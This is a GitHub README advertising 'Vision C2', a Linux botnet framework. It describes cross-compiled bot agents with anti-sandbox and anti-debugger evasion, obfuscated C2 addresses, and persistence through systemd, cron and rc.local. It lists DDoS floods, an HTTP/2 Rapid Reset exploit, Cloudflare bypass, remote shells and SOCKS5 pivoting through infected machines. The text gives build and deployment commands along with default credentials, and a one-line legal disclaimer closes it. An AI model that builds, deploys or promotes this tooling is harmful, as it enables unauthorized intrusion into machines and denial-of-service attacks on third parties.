
<div align="center">
 
## Vision C2 - Advanced Linux Botnet Framework


> 14-arch cross-compiled agents. DDoS, RCE, SOCKS5 pivoting. TLS 1.3 transport.
> Full AES encryption. Anti-analysis, anti-sandbox, anti-debugger checks. Full daemonized persistence.
> Zero plaintext in the binary. Driven through a real-time Go TUI.

[Video Showcasing Full Features + Installation](https://www.youtube.com/watch?v=KkIg24KwpB0)

![Go](https://img.shields.io/badge/Go-1.24.0+-00ADD8?style=for-the-badge&logo=go)
![Platform](https://img.shields.io/badge/Platform-Linux-009688?style=for-the-badge&logo=linux&logoColor=white)
[![Changelog](https://img.shields.io/badge/Changelog-Documentation-blueviolet?style=for-the-badge)](Docs/CHANGELOG.md)



<img width="907" height="840" alt="CNC Dashboard (BubbleTea TUI)" src="https://github.com/user-attachments/assets/5013c6de-7ac0-4ef8-9aaa-3900c7558b16" />

</div>

---

## Why Vision?

| | |
|---|---|
| **Automated Setup** | Python wizard handles config, compilation, and deployment. Run once, done. |
| **Encrypted Transport** | TLS 1.3 bot↔C2 over port 443. Indistinguishable from normal HTTPS. |
| **Anti-Analysis** | 40+ VM/sandbox/debugger signatures. Parent process detection. Sandboxes never reach `main()`. |
| **Stealth Driven** | All strings AES-128-CTR encrypted at build time (unique per build split-key derivation). C2 address decoded through a 6-layer pipeline: AES → Base64 → XOR → RC4 → byte-sub → MD5 check. Custom UPX packer obfuscates every binary. |
| **HMAC Registration** | MD5 challenge-response with per-campaign sync tokens. Replay-proof. |
| **Triple Persistence** | Systemd + cron watchdog + rc.local. Kill one, the others revive it. |
| **SOCKS5 Pivoting** | Route SOCKS5 through bot or optionally backconnect through your configured proxy relay endpoints.   |
| **Remote Shell** | Full output capture. Built-in Linux shortcuts + post-exploit helpers. |
| **Daemon Stealth** | Fork+setsid, disguised process names, PID lock prevents duplicate agents. |
| **L7 Arsenal** | Cloudflare bypass, HTTP/2 Rapid Reset (CVE-2023-44487), TLS bypass, proxy list support. |

---

## Attack Methods

<details>
<summary><b>Layer 4 — Network/Transport</b></summary>
<br>

| Method | Description |
|---|---|
| **UDP Flood** | High-volume 1024-byte payload spam |
| **TCP Flood** | Connection table exhaustion |
| **SYN Flood** | Randomized source ports (raw TCP) |
| **ACK Flood** | ACK packet flooding (raw TCP) |
| **GRE Flood** | GRE protocol 47, max payload |
| **DNS Flood** | Randomized query types, DNS reflection |

</details>

<details>
<summary><b>Layer 7 — Application</b></summary>
<br>

| Method | Description |
|---|---|
| **HTTP Flood** | GET/POST with randomized headers + user-agents |
| **HTTPS/TLS Flood** | TLS handshake exhaustion + burst requests |
| **CF Bypass** | Cloudflare bypass via session/cookie reuse + fingerprinting |
| **Rapid Reset** | HTTP/2 exploit (CVE-2023-44487), batched HEADERS + RST_STREAM |
| **Proxy Support** | Full proxy integration for all L7 methods (HTTP + SOCKS5) |

</details>

---

## Installation

### Prerequisites

```bash
sudo apt update && sudo apt install -y openssl git wget gcc python3 screen 

# Go 1.24+
wget https://go.dev/dl/go1.24.1.linux-amd64.tar.gz
sudo rm -rf /usr/local/go && sudo tar -C /usr/local -xzf go1.24.1.linux-amd64.tar.gz
echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc && source ~/.bashrc
```

| Requirement | Minimum | Recommended |
|---|---|---|
| RAM / Storage | 512 MB / 1 GB | 2 GB+ / 5 GB+ |
| OS | Linux (any) | Ubuntu 22.04+ / Debian 12+ |
| Network | Port 443 open | + Admin port for split mode |

### Setup

```bash
git clone https://github.com/Syn2Much/VisionC2.git && cd VisionC2
python3 setup.py   # Select [1] Full Setup
```

The wizard prompts for your **C2 address**, **admin port** (default `420`), and **TLS cert details**. Output:

```
bins/              → 14 bot binaries (multi-arch)
cnc/certificates/  → server.crt + server.key
server             → CNC binary
setup_config.txt   → Config summary
```

To change the C2 address later: `python3 setup.py` → option `[2]`. Redeploy bots afterward.

### Starting the CNC

```bash
./server              # TUI mode (default)

./server --split      # Telnet mode on admin port(legacy, only for those needing to manage multiple remote users)
```

Run in background with `screen -S vision ./server` (detach: `Ctrl+A, D`).

Split mode: `nc YOUR_IP 420` → type `spamtec` → login. (legacy)

> Full binary map: [`build.sh`](tools/build.sh)

---

```bash
# Full interactive setup (generates crypto, patches config, builds everything)
python3 setup.py

# Build CNC server only
go build -trimpath -ldflags="-s -w -buildid=" -o server ./cnc

# Build single bot binary (e.g. amd64)
GOOS=linux GOARCH=amd64 go build -trimpath -ldflags="-s -w -buildid=" -o bins/ethd0 ./bot

# Cross-compile all 14 bot architectures (with strip + UPX + signature removal)
cd tools && ./build.sh

# Verify encrypted config blobs are valid
go run tools/crypto.go verify

# Encrypt/decrypt strings for config
go run tools/crypto.go encrypt "string"
go run tools/crypto.go decrypt <hex>

# Build relay server (deploy on separate VPS)
go build -trimpath -ldflags="-s -w -buildid=" -o relay ./relay

# Run relay (must match bot's syncToken / CNC MAGIC_CODE)
./relay -key <magic_code> -cp 9001 -sp 1080

```

## 🎨 TUI Navigation

| Key | Action |
|---|---|
| `↑/↓` or `k/j` | Navigate |
| `Enter` | Select |
| `q` / `Esc` | Back / Cancel |
| `r` | Refresh |

### Dashboard Views

- **🤖 Bot List** — Live bot status. `Enter`=shell, `b`=broadcast shell, `l`=attack, `i`=info, `p`=persist, `r`=reinstall, `k`=kill
- **💻 Remote Shell** — Interactive shell to one bot. `Ctrl+F`=clear, `Ctrl+P`=persist, `Ctrl+R`=reinstall
- **📡 Broadcast Shell** — Command all bots. `Ctrl+A`=filter arch, `Ctrl+G`=filter RAM, `Ctrl+B`=limit bots
- **⚡ Launch Attack** — Select method, target, port, duration → `l` to launch
- **📊 Ongoing Attacks** — Progress bars + time remaining. `s`=stop all
- **🧦 Socks Manager** — `s`=start socks, `x`=stop. Default: `socks5://visionc2:synackrst666@BOT_IP:1080`. Update creds: `!socksauth <user> <pass>`
- **📜 Connection Logs** — Bot connect/disconnect history

---

## Architecture

**Bot lifecycle:** decrypt config → daemonize → singleton lock → sandbox detect → persistence (systemd/cron/rc.local) → DNS resolve C2 → TLS connect → auth (HMAC challenge-response) → command loop with auto-reconnect.

**CNC modes:** TUI (`cnc/ui.go`, ~3400 lines, Bubble Tea) or split/telnet CLI (`cnc/cmd.go`). RBAC with 4 tiers: Basic/Pro/Admin/Owner.

**Bot-CNC protocol:** TLS 1.2+ on port 443. HMAC auth using `magicCode`. Bot sends `REGISTER:version:botID:arch:RAM:CPU:procName:uplink`. Commands/responses are plaintext over TLS. Keepalive: PING/PONG every 60s, stale cleanup after 5min.

**SOCKS5 backconnect proxy:** Bot connects OUT to a relay server (`relay/`) via TLS. Relay has two ports: control (for bots, TLS) and SOCKS5 (for clients, plaintext). When a SOCKS5 client connects to the relay, the relay signals the bot over the control channel, bot opens a new data connection, and runs the SOCKS5 protocol through the relay tunnel. C2 address is never exposed — relay is separate infrastructure. Relay endpoints can be pre-configured at build time via `setup.py` or specified at runtime via `!socks <relay:port>`.

---

## Documentation

| | |
|---|---|
| [`ARCHITECTURE.md`](Docs/ARCHITECTURE.md) | Full system architecture |
| [`CHANGELOG.md`](Docs/CHANGELOG.md) | Version history |
| [`COMMANDS.md`](Docs/COMMANDS.md) | Command reference |
| [`SETUP.md`](Docs/SETUP.md) | Setup guide |

---

## Key Dependencies

- `github.com/charmbracelet/bubbletea` — TUI framework (CNC)
- `github.com/google/gopacket` — raw packet crafting (L4 attacks)
- `github.com/miekg/dns` — DNS protocol (C2 resolution, DNS attacks)
- External: `upx` (binary compression), `python3` (setup wizard), `openssl` (cert generation)

  
## Legal Disclaimer

**For authorized security research and educational purposes only.** Usage of this tool against targets without prior mutual consent is illegal. The developer assumes no liability for misuse or damage caused by this program.

---

<div align="center">

**Syn2Much** — [hell@sinnners.city](mailto:hell@sinnners.city) | [@synacket](https://x.com/synacket)

</div>
